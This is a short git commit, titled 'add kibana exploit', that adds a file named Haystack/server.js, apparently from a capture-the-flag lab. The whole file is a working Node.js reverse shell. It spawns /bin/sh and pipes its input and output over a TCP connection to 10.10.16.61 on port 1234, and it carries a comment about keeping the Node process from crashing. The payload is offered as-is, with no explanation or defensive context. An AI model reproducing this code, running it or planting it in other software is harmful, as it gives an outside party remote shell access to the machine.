948ce7eb0a739b9653fb20b6821100cb8c2b88a5
root <neal1991@sina.com>
2019-07-31 13:26:01 +0000

    add kibana exploit

---
+++ Haystack/server.js
@@ -0,0 +1,12 @@
+(function(){
+    var net = require("net"),
+        cp = require("child_process"),
+        sh = cp.spawn("/bin/sh", []);
+    var client = new net.Socket();
+    client.connect(1234, "10.10.16.61", function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/; // Prevents the Node.js application form crashing
+})();
